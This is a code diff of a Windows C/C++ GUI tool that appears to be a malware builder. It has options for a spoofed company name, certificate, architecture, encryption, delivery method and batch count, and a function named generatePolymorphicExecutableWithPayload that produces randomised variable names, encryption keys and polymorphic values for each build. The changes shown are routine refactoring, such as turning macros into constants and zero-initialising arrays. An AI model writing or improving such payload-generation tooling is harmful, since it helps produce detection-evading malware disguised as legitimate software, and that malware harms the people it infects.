@@ -25,20 +25,20 @@
 #pragma comment(lib, "ole32.lib")
 
 // Control IDs
-#define ID_INPUT_BROWSE 1001
-#define ID_OUTPUT_BROWSE 1002
-#define ID_COMPANY_COMBO 1003
-#define ID_CERT_COMBO 1004
-#define ID_ARCH_COMBO 1005
-#define ID_ENCRYPTION_COMBO 1006
-#define ID_DELIVERY_COMBO 1007
-#define ID_BATCH_COUNT 1008
-#define ID_AUTO_FILENAME 1009
-#define ID_GENERATE_BUTTON 1010
-#define ID_PROGRESS_BAR 1011
-#define ID_STATUS_TEXT 1012
-#define ID_INPUT_PATH 1013
-#define ID_OUTPUT_PATH 1014
+const int ID_INPUT_BROWSE = 1001;
+const int ID_OUTPUT_BROWSE = 1002;
+const int ID_COMPANY_COMBO = 1003;
+const int ID_CERT_COMBO = 1004;
+const int ID_ARCH_COMBO = 1005;
+const int ID_ENCRYPTION_COMBO = 1006;
+const int ID_DELIVERY_COMBO = 1007;
+const int ID_BATCH_COUNT = 1008;
+const int ID_AUTO_FILENAME = 1009;
+const int ID_GENERATE_BUTTON = 1010;
+const int ID_PROGRESS_BAR = 1011;
+const int ID_STATUS_TEXT = 1012;
+const int ID_INPUT_PATH = 1013;
+const int ID_OUTPUT_PATH = 1014;
 
 // Global variables
 HWND hMainWindow;
@@ -177,27 +177,28 @@ static void generatePolymorphicExecutableWithPayload(char* sourceCode, size_t ma
     }
     
     // Generate unique random variables
-    char randVar1[20], randVar2[20], randVar3[20], randVar4[20], randVar5[20], randVar6[20];
+    char randVar1[20] = {0}, randVar2[20] = {0}, randVar3[20] = {0}, randVar4[20] = {0}, randVar5[20] = {0}, randVar6[20] = {0};
     srand((unsigned int)(time(NULL) ^ (DWORD)GetTickCount64() ^ GetCurrentProcessId()));
     
     const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    const int charsetSize = sizeof(charset) - 1;
     for (int i = 0; i < 6; i++) {
         char* var = (i == 0) ? randVar1 : (i == 1) ? randVar2 : (i == 2) ? randVar3 : 
                    (i == 3) ? randVar4 : (i == 4) ? randVar5 : randVar6;
         for (int j = 0; j < 15; j++) {
-            var[j] = charset[rand() % (sizeof(charset) - 1)];
+            var[j] = charset[rand() % charsetSize];
         }
         var[15] = '\0';
     }
     
     // Generate encryption keys
-    unsigned char key[64];
+    unsigned char key[64] = {0};
     for (int i = 0; i < 64; i++) {
         key[i] = (unsigned char)(rand() % 256);
     }
     
     // Generate polymorphic values
-    int polyVars[10];
+    int polyVars[10] = {0};
     for (int i = 0; i < 10; i++) {
         polyVars[i] = rand() % 100000;
     }
